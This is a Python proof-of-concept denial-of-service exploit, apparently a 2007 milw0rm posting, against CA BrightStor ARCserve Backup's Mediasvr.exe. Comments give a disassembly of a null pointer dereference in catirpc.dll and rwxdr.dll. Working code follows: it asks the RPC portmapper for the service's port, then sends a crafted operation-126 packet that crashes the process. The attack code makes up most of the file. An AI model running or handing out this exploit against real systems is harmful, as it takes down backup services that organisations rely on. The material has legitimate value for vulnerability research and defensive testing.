#!/usr/bin/python
#
# Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll)
# (Previously Unknown)
#
# There is an issue with RPC operation 126 and the imported cactirpc.dll 
# and rwxdr.dll. It looks as if Mediasvr.exe identifies a Bad Job Handle 
# as seen in its log file.
# 
# Log Message:
# asms_manager_job_enumerate_devices_1_svc(): Bad Job Handle.  
#
# However, the process dies when trying to send an RPC response 
# for the bad job handle. This is caused be a null memory dereference.
# Within cactirpc.dll, the xdr_rwpair function is called: 
#
# Catirpc.dll:2E008A93 loc_2E008A93:                          
# Catirpc.dll:2E008A93 mov     ecx, [esi+10h]
# Catirpc.dll:2E008A96 push    ecx	<- ECX is 0x0041B310 (nulls)
# Catirpc.dll:2E008A97 push    edi	<- EDI is 0x009e2580 (nulls)
# Catirpc.dll:2E008A98 call    dword ptr [esi+14h] <-points to 0x2d6054f0
# Catirpc.dll:2E008A9B add     esp, 8		    (rwxdr.dll:xdr_rwpair)
# Catirpc.dll:2E008A9E pop     edi
# Catirpc.dll:2E008A9F pop     esi
# Catirpc.dll:2E008AA0 pop     ebx
# Catirpc.dll:2E008AA1 retn
#
# rwxdr.dll:xdr_rwpair
# .text:2D6054F0 public xdr_rwpair
# .text:2D6054F0 xdr_rwpair proc near                    
# .text:2D6054F0    
# .text:2D6054F0 arg_0= dword ptr  4
# .text:2D6054F0 arg_4= dword ptr  8
# .text:2D6054F0
# .text:2D6054F0 push    ebx
# .text:2D6054F1 mov     ebx, [esp+4+arg_4] <---puts 0x0041B310
# .text:2D6054F5 push    esi
# .text:2D6054F6 push    edi
# .text:2D6054F7 mov     edi, [esp+0Ch+arg_0] <--- puts 0x009e2580
# .text:2D6054FB mov     esi, [ebx]	<---- EBX is 0x00000000
# .text:2D6054FD mov     eax, [edi]     <---- EDI is 0x00000000
# .text:2D6054FF test    eax, eax
# .text:2D605501 jnz     short loc_2D605533
# .text:2D605503 mov     eax, [esi+4]	<---- ESI is set to 0x00000000
#
# This was tested on BrightStor ARCserve Backup 11.5.2.0 (SP2) with the latest 
# CA patches on Windows XP SP2 
#
# CA has been notified
#
# Author: M. Shirk
#
# (c) Copyright 2007 (Shirkdog Security) shirkdog_list $ at % hotmail dot com 
#
# Use at your own Risk: You have been warned 
#------------------------------------------------------------------------

import os
import sys
import time
import socket
import struct

#------------------------------------------------------------------------

#Start of RPC Packet
rpc_packet="\x80\x00\x00\x5c\x6b\x9b\x72\xbc\x00\x00\x00\x00\x00\x00\x00\x02"

#Program ID, and Operation 126
rpc_packet+="\x00\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x7e"

#nulls after Operation
rpc_packet+="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#4 more bytes of junk (ALL HAIL BEEF)
rpc_packet+="\xde\xad\xbe\xef"

# Need to get the port Mediasvr.exe is listening on
rpc_portmap_req="\x80\x00\x00\x38\x21\x84\xf7\xc9\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x09\x7e\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00"

#------------------------------------------------------------------------

def ExploitMediaSvr(target,port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, port))
	sock.send(rpc_packet)
   	sock.close()
	print '[+] Done...\n[+] Mediasvr.exe is dead\n[+] ... or it will die in a few seconds for you inpatient bastards\n'


def GetMediaSvrPort(target):
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((target,111))
	sock.send(rpc_portmap_req)
	rec = sock.recv(256)

	port1 = rec[-4]
	port2 = rec[-3]
	port3 = rec[-2]
	port4 = rec[-1]	
	
	port1 = hex(ord(port1))
	port2 = hex(ord(port2))
	port3 = hex(ord(port3))
	port4 = hex(ord(port4))
	port = '%02x%02x%02x%02x' % (int(port1,16),int(port2,16),int(port3,16),int(port4,16))
	
	port = int(port,16)
	
	print '[+] Sending TCP Packet of Death to Target: %s Port: %s' % (target,port)
	ExploitMediaSvr(target,port)
	



if __name__=="__main__":
       try:
               target = sys.argv[1]
       except IndexError:
           	print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll)'
       		print '[+] Author: Shirkdog'
               	print '[+] Usage: %s <target ip>\n' % sys.argv[0]
               	sys.exit(-1)

       print '[+] Computer Associates (CA) Brightstor Backup Mediasvr.exe DoS (catirpc.dll/rwxdr.dll)'
       print '[+] Author: Shirkdog'

       GetMediaSvrPort(target)

# milw0rm.com [2007-05-16]
